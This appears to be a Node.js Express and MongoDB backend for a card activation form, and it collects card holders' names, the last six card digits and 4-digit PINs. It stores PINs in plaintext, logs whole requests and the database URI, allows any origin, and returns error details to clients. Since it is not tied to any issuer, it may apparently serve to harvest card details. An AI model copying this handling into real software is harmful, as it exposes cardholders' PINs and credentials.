const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const app = express();

require("dotenv").config();

app.use(express.json());

// Configure CORS to allow all origins
app.use(cors());

const PORT = process.env.PORT || 3001;

// MongoDB Connection with enhanced debugging and corrected timeout
const mongoUri = process.env.MONGODB_URI;
if (!mongoUri) {
  console.error(
    "MONGODB_URI is not defined in .env. Please set it in your .env file."
  );
  process.exit(1);
}

const connectWithRetry = () => {
  console.log("Attempting to connect to MongoDB with URI:", mongoUri); // Debug URI
  mongoose
    .connect(mongoUri, {
      serverSelectionTimeoutMS: 30000, // Set to 30 seconds
      heartbeatFrequencyMS: 10000,
      retryWrites: true,
      w: "majority",
      autoIndex: true, // Ensure indexes are created
    })
    .then(() => {
      console.log("Connected to MongoDB successfully");
    })
    .catch((err) => {
      console.error("MongoDB connection error:", {
        message: err.message,
        name: err.name,
        reason: err.reason,
        code: err.code,
        stack: err.stack,
      });
      console.log("Retrying connection in 5 seconds...");
      setTimeout(connectWithRetry, 5000); // Retry after 5 seconds
    });
};

connectWithRetry();

mongoose.connection.on("disconnected", () => {
  console.log("MongoDB disconnected. Attempting to reconnect...");
  connectWithRetry();
});

mongoose.connection.on("error", (err) => {
  console.error("MongoDB connection error event:", err);
});

mongoose.connection.on("reconnected", () => {
  console.log("MongoDB reconnected successfully");
});

process.on("SIGINT", () => {
  mongoose.connection.close(() => {
    console.log("MongoDB connection closed due to app termination");
    process.exit(0);
  });
});

const activationSchema = new mongoose.Schema({
  cardType: { type: String, required: true },
  lastSixDigits: { type: String, required: true },
  holderName: { type: String, required: true },
  currency: { type: String, required: true },
  dailyLimit: { type: Number, required: true },
  accept: { type: Boolean, required: true },
  pin: { type: String, required: true },
  createdAt: { type: Date, default: Date.now },
});

const Activation = mongoose.model("Activation", activationSchema);

// Validate last 6 digits
app.post("/validate-digits", async (req, res) => {
  const { lastSixDigits } = req.body;
  console.log("Validating digits:", lastSixDigits);

  try {
    if (!lastSixDigits) {
      return res
        .status(400)
        .json({ message: "Please provide the last 6 digits of your card." });
    }
    if (lastSixDigits.length !== 6 || !/^\d+$/.test(lastSixDigits)) {
      return res
        .status(400)
        .json({ message: "The last 6 digits must be exactly 6 numbers." });
    }
    return res.status(200).json({ message: "Digits validated successfully" });
  } catch (error) {
    console.error("Server error in /validate-digits:", error);
    return res.status(500).json({
      message: "An unexpected error occurred. Please try again later.",
    });
  }
});

// Activate card with PIN
app.post("/activate", async (req, res) => {
  const {
    cardType,
    lastSixDigits,
    holderName,
    currency,
    dailyLimit,
    accept,
    pin,
  } = req.body;
  console.log("Activating card with data:", req.body);

  try {
    if (
      !cardType ||
      !lastSixDigits ||
      !holderName ||
      !currency ||
      dailyLimit == null ||
      accept == null ||
      !pin
    ) {
      return res
        .status(400)
        .json({ message: "All fields are required to activate your card." });
    }

    if (lastSixDigits.length !== 6 || !/^\d+$/.test(lastSixDigits)) {
      return res
        .status(400)
        .json({ message: "The last 6 digits must be exactly 6 numbers." });
    }

    const limit = parseInt(dailyLimit);
    if (isNaN(limit) || limit > 5000 || limit < 0) {
      return res
        .status(400)
        .json({ message: "Daily limit must be a number between 0 and 5000." });
    }

    const validCurrencies = [
      "USD",
      "EUR",
      "GBP",
      "JPY",
      "CAD",
      "AUD",
      "CHF",
      "CNY",
      "INR",
      "ZAR",
    ];
    if (!validCurrencies.includes(currency)) {
      return res
        .status(400)
        .json({ message: "Unsupported currency selected." });
    }

    if (pin.length !== 4 || !/^\d+$/.test(pin)) {
      return res.status(400).json({ message: "PIN must be exactly 4 digits." });
    }

    if (!accept) {
      return res
        .status(400)
        .json({ message: "You must accept the terms to proceed." });
    }

    const newActivation = new Activation({
      cardType,
      lastSixDigits,
      holderName,
      currency,
      dailyLimit: limit,
      accept,
      pin,
    });
    await newActivation.save();
    console.log("Activation saved to DB");

    return res.status(200).json({ message: "Card activated successfully" });
  } catch (error) {
    console.error("Server error in /activate:", error);
    return res.status(500).json({
      message: "An unexpected error occurred. Please try again later.",
      error: error.message, // Include error details for debugging
    });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
